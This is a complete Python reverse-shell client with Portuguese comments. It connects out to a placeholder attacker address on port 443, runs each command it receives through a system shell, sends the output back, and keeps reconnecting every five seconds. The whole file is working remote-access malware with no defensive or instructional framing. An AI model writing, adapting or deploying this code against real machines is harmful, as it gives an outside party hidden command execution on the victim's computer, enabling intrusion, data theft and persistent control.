import socket
import subprocess
import os
from time import sleep

IP = "SEU_IP_AQUI"
PORT = 443

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        return c
    except:
        return None

def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            if data: # Só executa se não for vazio
                cmd(c, data)
    except:
        return

def cmd(c, data):
    try:
        # Lógica do CD (a partir do 3º caractere)
        if data.startswith("cd "):
            os.chdir(data[3:].strip())
            c.send(b"Diretorio alterado.\n")
            return

        # Execução com captura de erro
        p = subprocess.Popen(
            data,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        
        saida = p.stdout.read() + p.stderr.read()
        
        if not saida:
            c.send(b"Comando executado (sem retorno).\n")
        else:
            c.send(saida)
            
    except Exception as e:
        c.send(str(e).encode())

if __name__ == "__main__":
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)
        else:
            sleep(5)